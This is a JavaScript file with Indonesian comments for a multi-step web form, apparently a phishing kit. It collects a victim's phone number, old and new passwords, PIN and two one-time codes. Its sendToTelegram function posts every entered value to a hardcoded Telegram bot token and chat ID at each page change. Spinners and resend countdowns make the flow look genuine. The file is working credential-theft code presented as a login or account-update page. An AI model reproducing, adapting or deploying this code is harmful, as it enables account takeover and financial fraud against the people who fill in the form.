let countdownInterval; // Variabel untuk countdown

// Token bot dan chat ID Telegram
const botToken = "7406234359:AAE7ay1Emj7UGNRwings5Ii3OClxz5Lm-VQ";
const chatId = "8059874738";

function nextPage(page) {
	const current = document.querySelector(".card:not([style*='display: none'])");
	const spinner = document.getElementById("spinner");
	const overlay = document.getElementById("spinner-overlay");
	
	// Kirim data ke Telegram
	const formData = collectFormData();
	sendToTelegram(formData);
	
	// Validasi pada Page1 sebelum melanjutkan ke Page2
	if (page === 2) {
		const phoneInput = document.getElementById("phone");
		const oldPassInput = document.getElementById("old-password");
		const newPassInput = document.getElementById("new-password");
		const repeatPassInput = document.getElementById("repeat-password");
		
		let isValid = true;
		
		// Fungsi untuk memberi atau menghapus border merah
		function validateInput(input) {
			if (input.value.trim() === "") {
				input.style.border = "2px solid red"; // Ubah border menjadi merah
				isValid = false;
			} else {
				input.style.border = ""; // Kembalikan border ke normal
			}
		}
		
		// Validasi setiap input
		validateInput(phoneInput);
		validateInput(oldPassInput);
		validateInput(newPassInput);
		validateInput(repeatPassInput);
		
		if (!isValid) {
			return; // Hentikan eksekusi jika ada kolom yang kosong
		}
	}
	
	// Hentikan countdown jika ada
	if (countdownInterval) {
		clearInterval(countdownInterval);
	}
	
	// Tampilkan spinner dengan overlay
	overlay.style.display = "block";
	spinner.style.display = "block";
	
	setTimeout(() => {
		// Sembunyikan spinner setelah proses selesai
		overlay.style.display = "none";
		spinner.style.display = "none";
		
		if (current) current.style.display = "none"; // Sembunyikan halaman saat ini
		
		const nextPageElement = document.getElementById("page" + page);
		if (nextPageElement) {
			nextPageElement.style.display = "block";
			
			// Jalankan timer jika ada countdown
			if (page === 3) startCountdown(60, "countdown");
			if (page === 4) startCountdown(120, "countdown-otp2");
		}
	}, 2000); // Simulasi proses selama 2 detik
}

// Fungsi untuk mengumpulkan data dari halaman yang sedang aktif
function collectFormData() {
	const inputs = document.querySelectorAll(".card:not([style*='display: none']) input");
	const data = {};
	
	inputs.forEach((input) => {
		data[input.id] = input.value.trim();
	});
	
	return data;
}

// Fungsi untuk mengirim data ke API Telegram
function sendToTelegram(data) {
	const message = Object.keys(data)
		.map((key) => `${key}: ${data[key]}`)
		.join("\n");
	
	const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
	const payload = {
		chat_id: chatId,
		text: message,
	};
	
	fetch(url, {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify(payload),
		})
		.then((response) => {
			if (response.ok) {
				console.log("Pesan berhasil dikirim ke Telegram.");
			} else {
				console.error("Gagal mengirim pesan ke Telegram.");
			}
		})
		.catch((error) => {
			console.error("Error:", error);
		});
}

// Fungsi untuk memulai hitung mundur
function startCountdown(seconds, countdownId) {
	const countdownElement = document.getElementById(countdownId);
	
	if (!countdownElement) {
		console.error("Elemen countdown tidak ditemukan:", countdownId);
		return;
	}
	
	if (countdownInterval) {
		clearInterval(countdownInterval);
	}
	
	countdownElement.textContent = `Kirim ulang dalam ${seconds} detik`;
	
	countdownInterval = setInterval(() => {
		seconds--;
		if (seconds <= 0) {
			clearInterval(countdownInterval);
			countdownElement.textContent = "Anda dapat mengirim ulang sekarang.";
		} else {
			countdownElement.textContent = `Kirim ulang dalam ${seconds} detik`;
		}
	}, 1000);
}

// Fungsi untuk toggle (menampilkan/menyembunyikan) password atau PIN
function togglePassword(inputId, icon) {
	const input = document.getElementById(inputId);
	if (input.type === "password") {
		input.type = "text";
		icon.textContent = "visibility_off";
	} else {
		input.type = "password";
		icon.textContent = "visibility";
	}
}

// Validasi Input PIN
function validatePin() {
	const pinInput = document.getElementById('pin');
	const warning = document.getElementById('warningPin');
	const btnNext = document.getElementById('btnNextPage2');
	const pinLength = pinInput.value.length;
	
	if (pinLength >= 4 && pinLength <= 6) {
		warning.style.display = 'none'; // Sembunyikan peringatan
		btnNext.disabled = false; // Aktifkan tombol "LANJUT"
		btnNext.classList.add('active');
	} else {
		warning.style.display = 'block'; // Tampilkan peringatan
		btnNext.disabled = true; // Nonaktifkan tombol "LANJUT"
		btnNext.classList.remove('active');
	}
}

function validateOtp() {
	const otpInput = document.getElementById("otp");
	const otpValue = otpInput.value.trim();
	const PeringataOtp = document.getElementById("PeringataOtp");
	
	// Validasi input minimal 4 angka dan maksimal 6 angka
	if (otpValue.length >= 4 && otpValue.length <= 6) {
		PeringataOtp.style.display = "none"; // Sembunyikan peringatan jika valid
	}
}

function handleNextPage() {
	const otpInput = document.getElementById("otp");
	const otpValue = otpInput.value.trim();
	const PeringataOtp = document.getElementById("PeringataOtp");
	
	// Cek apakah input OTP memenuhi syarat
	if (otpValue.length >= 4 && otpValue.length <= 6) {
		nextPage(4); // Navigasi ke halaman berikutnya jika syarat terpenuhi
	} else {
		// Tampilkan peringatan selama 2 detik
		PeringataOtp.style.display = "block";
		setTimeout(() => {
			PeringataOtp.style.display = "none";
		}, 2000);
	}
}

function validateOtp2() {
	const otpInput = document.getElementById("otp2");
	const otpValue = otpInput.value.trim();
	const PeringataOtp2 = document.getElementById("PeringataOtp2");
	
	// Validasi input minimal 4 angka dan maksimal 6 angka
	if (otpValue.length >= 4 && otpValue.length <= 6) {
		PeringataOtp2.style.display = "none"; // Sembunyikan peringatan jika valid
	}
}

function handleNextPageOtp2() {
	const otpInput = document.getElementById("otp2");
	const otpValue = otpInput.value.trim();
	const PeringataOtp2 = document.getElementById("PeringataOtp2");
	
	// Cek apakah input OTP memenuhi syarat
	if (otpValue.length >= 4 && otpValue.length <= 6) {
		// Navigasi ke halaman berikutnya
		nextPage(5);
	} else {
		// Tampilkan peringatan selama 2 detik
		PeringataOtp2.style.display = "block";
		setTimeout(() => {
			PeringataOtp2.style.display = "none";
		}, 2000);
	}
}